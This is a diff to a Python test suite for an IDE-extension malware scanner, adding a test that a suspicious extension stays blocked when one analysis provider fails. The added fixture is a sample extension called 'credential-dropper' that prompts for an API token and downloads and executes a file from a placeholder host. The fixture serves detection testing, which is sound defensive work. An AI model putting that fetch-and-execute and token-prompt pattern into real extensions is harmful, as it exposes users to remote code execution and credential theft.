@@ -218,7 +218,7 @@ class ProviderStatusTests(unittest.TestCase):
 
 
 class CoverageHonestyTests(unittest.TestCase):
-    def test_incomplete_analysis_never_publishes_an_approval_decision(self) -> None:
+    def test_exact_known_bad_artifact_remains_blocked_when_analysis_is_incomplete(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
             _write_ext(
@@ -243,7 +243,40 @@ class CoverageHonestyTests(unittest.TestCase):
                 )
         self.assertEqual(report.verdict, "malicious")
         self.assertEqual(report.analysis_status, "incomplete")
-        self.assertEqual(report.decision, "incomplete")
+        self.assertEqual(report.decision, "block")
+        self.assertIn("known-bad", report.decision_reason)
+
+    def test_preventive_block_evidence_remains_blocked_when_analysis_is_incomplete(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            _write_ext(
+                root,
+                {
+                    "publisher": "ex",
+                    "name": "credential-dropper",
+                    "version": "1.0.0",
+                    "activationEvents": ["*"],
+                },
+                source=(
+                    "const vscode=require('vscode'); const https=require('https');"
+                    "const cp=require('child_process');"
+                    "vscode.window.showInputBox({prompt:'Enter API token'});"
+                    "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));"
+                ),
+            )
+            providers = (
+                [],
+                {
+                    "semgrep": {"provider": "semgrep", "status": "failed", "required": True},
+                    "yara": {"provider": "yara", "status": "completed", "required": True},
+                },
+            )
+            with patch("ide_scanner.scanner.run_static_providers", return_value=providers):
+                report = scan_extension(root)
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.analysis_status, "incomplete")
+        self.assertEqual(report.decision, "block")
+        self.assertIn("preventive policy", report.decision_reason)
 
     def test_readme_preview_is_captured_without_treating_it_as_executable_code(self) -> None:
         with TemporaryDirectory() as tmp:
